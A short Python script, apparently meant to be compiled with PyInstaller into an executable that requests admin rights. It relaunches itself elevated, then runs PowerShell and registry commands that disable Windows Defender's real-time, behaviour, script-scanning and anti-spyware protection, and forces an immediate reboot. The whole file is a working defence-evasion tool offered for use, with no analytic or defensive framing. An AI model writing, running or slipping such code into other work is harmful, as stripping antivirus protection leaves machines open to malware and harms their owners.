#!usr/bin/env python3
# run this -> pyinstaller --onefile --uac-admin disable_windows_def.py
import os
import ctypes
import sys

# Check if running as Administrator
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

powershell_command = """
Set-MpPreference -DisableRealtimeMonitoring $true;
Set-MpPreference -DisableBehaviorMonitoring $true;
Set-MpPreference -DisableIOAVProtection $true;
Set-MpPreference -DisableScriptScanning $true;
Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1;
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f;
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f;
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f;
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f;
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f;
"""

def run_powershell(cmd):
    os.system(f'powershell -Command "{cmd}"')

if is_admin():
    run_powershell(powershell_command)

    os.system("shutdown -r -t 0")
else:
    script = os.path.abspath(sys.argv[0])
    os.system(f'powershell -Command "Start-Process python -ArgumentList \'{script}\' -Verb RunAs"')